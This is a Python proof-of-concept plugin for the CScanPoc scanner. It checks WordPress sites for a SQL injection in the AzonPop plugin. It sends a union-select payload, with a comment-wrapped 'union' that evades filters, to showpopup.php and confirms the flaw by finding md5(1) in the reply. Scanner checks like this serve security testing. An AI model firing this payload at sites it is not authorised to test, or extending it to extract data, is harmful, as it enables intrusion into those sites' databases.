# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'WordPress_0096' # 平台漏洞编号，留空
    name = 'Wordpress AzonPop Plugin SQL Injection' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-01-09'  # 漏洞公布时间
    desc = '''
        Wordpress AzonPop Plugin SQL Injection.
    ''' # 漏洞描述
    ref = 'https://cxsecurity.com/issue/WLB-2016010049' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'Wordpress AzonPop Plugin'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9a2d8164-119f-433a-bed0-0d6ac3e13d5c'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/wp-content/plugins/AzonPop/files/view/showpopup.php?popid=null%20%20/*!00000union*/%20select%201,2,md5(1),4,5'
            target = arg + payload
            
            code, head, res, errcode, _ = hh.http(target);
            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res :
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()